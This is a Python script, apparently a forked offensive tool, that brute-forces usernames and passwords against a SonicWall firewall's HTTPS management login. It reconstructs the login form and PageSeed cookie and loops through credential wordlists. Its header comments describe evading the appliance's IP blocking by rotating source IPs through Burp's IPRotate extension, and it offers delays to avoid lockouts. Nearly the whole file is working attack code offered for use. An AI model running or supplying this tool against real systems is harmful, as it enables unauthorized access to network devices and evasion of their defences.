#!/usr/bin/python3

# SonicWallBruteForce (j0mbie's version)
# 
# Script to brute force credentials against a SonicWall HTTPS management page.
# 
# Forked from Hoodoer's work:  
# https://github.com/hoodoer/sonicWallBruteForce
# 
# Based on gist by Vasuman to do autologins:  
# https://gist.github.com/vasuman/fa750a6fe57fc8a73aff
# 
# 
# SonicWall can be pretty IP blocking happy. Consider using the HTTP proxy feature to pass
# this through Burp, and use IPRotate extension to snag a new source IP for every request. See:  
# https://portswigger.net/bappstore/2eb2b1cb1cf34cc79cda36f0f9019874
#   
#   
# Prerequisites:  
# 
# Python 3
# Windows installer: https://www.python.org/downloads/release/python-3114/
# 
# "Requests" Python package
# In Windows, from your Python directory, run:
# `Scripts\pip.exe install requests
# 
#  
# Options:
# 
# -host          URL of the target. Example: https://somesonicwall.xyz (Required.)
# -userlist      User list, in a text file. One entry per line.
# -password      Single password to try. Useful for testing the script.
# -passwordlist  Password list, in a text file. One entry per line.
# -proxy         HTTP proxy.
# -delay         How many seconds to wait before moving to the next password in the list.
# -debug         Print a lot of extra stuff.
# 


import time
import re
from hashlib import md5
from html.parser import HTMLParser
import sys
import argparse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


VERIFY = False


class InputFieldParser(HTMLParser):
    def handle_starttag(self, tag, attr_pairs):
        if tag != 'input':
            return

        attr_dict = dict(attr_pairs)

        if not 'name' in attr_dict:
            return
        if not 'value' in attr_dict:
            return

        name  = attr_dict['name']
        value = attr_dict['value']

        if name == 'param2':
            if debug:
                print("Random param: " + value)
            self.param2 = value
        elif name == 'id':
            if debug:
                print("ID: " + value)
            self.rid = value


def bake_cookies(p):
    cookies = {}
    seedString = p.param2 + password
    seedString = seedString.encode('utf-8')

    page_seed = md5(seedString).hexdigest()

    if debug:
        print("PageSeed: " + page_seed)

    cookies['PageSeed'] = page_seed
    # Dunno?
    cookies['temp'] = 'temp'
    return cookies




def make_form(p):
    form = {}
    form['param1']  = ''
    form['param2']  = p.param2
    form['id']      = p.rid
    form['select2'] = 'English'
    form['uName']   = user
    form['pass']    = password
    form['digest']  = ''
    return form




# This should be what sets up our class
def req_login_page():
    if proxy is None:
        resp = requests.get(LOGIN_PORTAL, verify = VERIFY, timeout=2.50)
    else:
        resp = requests.get(LOGIN_PORTAL, verify = VERIFY, proxies=proxies)

    if debug:
    	print("********************************************")
    	print("Parsing login page at: " + LOGIN_PORTAL)
    	print("Login page response: " + str(resp.status_code))
    	print("Login page content: " + str(resp.text))
    	print("********************************************")
    	
    parser = InputFieldParser()

    parser.feed(resp.text)

    return parser





def do_login():

    try:

        p = req_login_page()

        cookies = bake_cookies(p)

        form    = make_form(p)

        # Check if we're using a proxy (e.g. Burp)
        if proxy is None:
            login_req = requests.post(AUTH_PAGE, data = form, cookies = cookies, verify = VERIFY, timeout=2.50)
        else:
            login_req = requests.post(AUTH_PAGE, data = form, cookies = cookies, verify = VERIFY, proxies=proxies)

        if login_req.status_code != 200:
            # Creds didn't work
            return False
        if login_req.text.find('auth.html') != -1:
            # Creds didn't work
            return False

        # If we're here, the creds worked
        # <insert happy dance>
        return True

    except:
        print("An error occured on password: " + password)





def main():
    parser = argparse.ArgumentParser(description='Sonic Wall brute force script')
    parser.add_argument("-host", help="host to target, e.g 'https://somesonicwall.xyz' (REQUIRED).", required=True)
    parser.add_argument("-userlist", help="user list (REQUIRED).", required=True)
    parser.add_argument("-password", help="password to use (single).")
    parser.add_argument("-passwordlist", help="password list. Seriously consider setting a delay value.")
    parser.add_argument("-proxy", help="HTTP proxy.")
    parser.add_argument("-delay", help="how many seconds to wait before moving to next password in list.")
    parser.add_argument("-debug", help="print extra stuffs.", action='store_true')

    args = parser.parse_args()

    global host, userlist, password, passwordlist, proxy, proxies, delay, debug

    host         = args.host
    userlist     = args.userlist
    password     = args.password
    passwordlist = args.passwordlist
    proxy        = args.proxy
    delay        = args.delay
    debug        = args.debug

    print("Sonic Wall brute force script\n")

    print("Host: " + str(host))
    print("userlist: " + str(userlist))
    print("password: " + str(password))
    print("delay: " + str(delay))
    print("passwordlist: " + str(passwordlist))
    print("proxy: " + str(proxy))
    print("debug: " + str(debug))
    print("\n")



    # Setup our proxy. Burp is a lovely choice. 
    if proxy != None:
        proxies = {
        "http" : proxy,
        "https" : proxy
        }



    # Setup endpoints to be used
    global LOGIN_PORTAL, AUTH_PAGE, HEARTBEAT, LOGIN_STATUS, DYN_LOGIN_STATUS, LOGOUT
    LOGIN_PORTAL     = host + '/auth1.html'
    AUTH_PAGE        = host + '/auth.cgi'
    HEARTBEAT        = host + '/usrHeartbeat.cgi'
    LOGIN_STATUS     = host + '/loginStatusTop.html'
    DYN_LOGIN_STATUS = host + '/dynLoginStatus.html?1stLoad=yes'
    LOGOUT           = host + '/dynLoggedOut.html?didLogout=yes'


    # Let's read in our user list
    global users
    userfile = open(userlist)
    try:
        users = userfile.readlines()
    finally:
        userfile.close()



    # Let's figure out what we're doing for passwords
    if password is None and passwordlist is None:
        print("You need a password list or a password set (-password or passwordlist). That should be obvious.")
        sys.exit(-1)
    elif password is not None and passwordlist is not None:
        print("You can only use a single password or a passwordlist, not both. Insert another quarter and try again.")
        sys.exit(-1)

    # Ok, only one of our password options are set, perfect
    # if it's just one password, we should be good already.
    # if we're using a password list, we need to read that fun stuff in
    global passwords
    if passwordlist is not None:
        passwordfile = open(passwordlist, 'r', errors='ignore')
        try:
            passwords = passwordfile.readlines()
        finally:
            passwordfile.close()
    else:
        # It's just one password
        passwords = password.split('\n')


    # Loppity loop loop time. 
    global user
    global PasswordCount
    global UserCounter
    global PasswordCounter

    UserCount = len(users)
    PasswordCount = len(passwords)
    print("Total user count: " + str(UserCount))
    print("Total password count: " + str(PasswordCount))
    print("Total combinations: " + str(UserCount * PasswordCount))
    
    UserCounter = 0
    
    for user in users:

        PasswordCounter = 0
        
        for password in passwords:

            PasswordCounter = PasswordCounter + 1

            try:
                
                user     = user.strip('\n')
                password = password.strip('\n')

                UserCounter = UserCounter + 1
                print("User " + str(UserCounter) + " of " + str(UserCount) + ". Password " + str(PasswordCounter) + " of " + str(PasswordCount) + ". Trying: " + user + " | " + password)

                if debug:
                    print("Trying: " + user + " | " + password)

                if do_login():
                    print("Success!:  " + user + " | " + password)
                    exit
                else:
                    if debug:
                        print("Invalid credentials: " + user + " | " + password)

            except:

                print("An error occured on password: " + password)

        # Should we wait between password cycles? To avoid lockouts/blocking?
        if delay is not None:
            print("Password loop done. Waiting " + str(delay) + " seconds...")
            time.sleep(int(delay))

        

    print("Done.")
    exit


if __name__ == '__main__':
    main()
